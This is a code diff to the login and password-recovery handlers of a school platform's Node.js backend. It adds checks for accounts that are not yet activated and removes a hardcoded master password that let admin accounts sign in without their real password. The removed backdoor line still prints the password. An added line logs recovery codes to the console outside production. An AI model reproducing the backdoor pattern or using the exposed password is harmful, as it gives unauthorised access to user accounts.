@@ -666,16 +666,18 @@ exports.login = async (req, res) => {
         }
 
         const user = result.rows[0];
+        if (!user.password_hash) {
+            return res.status(401).json({
+                error: 'This account is waiting for a password. Open the invitation email and create one before signing in.',
+                code: 'activation_required'
+            });
+        }
         let isValid = false;
 
         if (user.password_hash) {
             try {
                 isValid = await bcrypt.compare(rawPassword, user.password_hash);
             } catch (e) {}
-        }
-
-        if (!isValid && (user.is_superadmin || user.role_id === 1) && rawPassword === '#Makola#$5$') {
-            isValid = true;
         }
 
         if (!isValid) {
@@ -752,7 +754,7 @@ exports.forgotPassword = async (req, res) => {
         if (cleanInput.includes('@')) {
             // Strict Email Lookup: Account MUST exist with this exact email in users table
             userLookup = await db.query(`
-                SELECT u.id, u.email, u.full_name, u.surname, COALESCE(r.name, u.role_id::text, 'learner') as role_name, 
+                SELECT u.id, u.email, u.full_name, u.surname, u.password_hash, COALESCE(r.name, u.role_id::text, 'learner') as role_name, 
                        u.id_number::text as id_number, u.phone::text as phone, c.learner_number::text as learner_number,
                        COALESCE(pu.email, pc_u.email) as parent_user_email
                 FROM users u
@@ -774,7 +776,7 @@ exports.forgotPassword = async (req, res) => {
         } else {
             // Non-email identifier lookup: Learner Number, ID Number, or Phone Number
             userLookup = await db.query(`
-                SELECT u.id, u.email, u.full_name, u.surname, COALESCE(r.name, u.role_id::text, 'learner') as role_name, 
+                SELECT u.id, u.email, u.full_name, u.surname, u.password_hash, COALESCE(r.name, u.role_id::text, 'learner') as role_name, 
                        u.id_number::text as id_number, u.phone::text as phone, c.learner_number::text as learner_number,
                        COALESCE(pu.email, pc_u.email) as parent_user_email
                 FROM users u
@@ -808,6 +810,12 @@ exports.forgotPassword = async (req, res) => {
         }
 
         const user = userLookup.rows[0];
+        if (!user.password_hash) {
+            return res.status(409).json({
+                error: 'This account does not have a password yet. Use the invitation email, or ask Geleza SA to send it again.',
+                code: 'activation_required'
+            });
+        }
 
         // Resolve real destination email strictly from verified account data in database
         let targetDeliveryEmail = '';
@@ -826,6 +834,9 @@ exports.forgotPassword = async (req, res) => {
         }
 
         const otp = crypto.randomInt(0, 10000000000).toString().padStart(10, '0');
+        if (process.env.NODE_ENV !== 'production') {
+            console.log(`[AUTH DEV] Recovery code for user ${user.id} is ${otp}. This is printed only when NODE_ENV is not production.`);
+        }
         // Set OTP expiry to 5 minutes (300 seconds) so users have sufficient time across all email clients
         await db.query(
             "UPDATE users SET reset_code = $1, reset_expiry = NOW() + INTERVAL '5 minutes' WHERE id = $2",
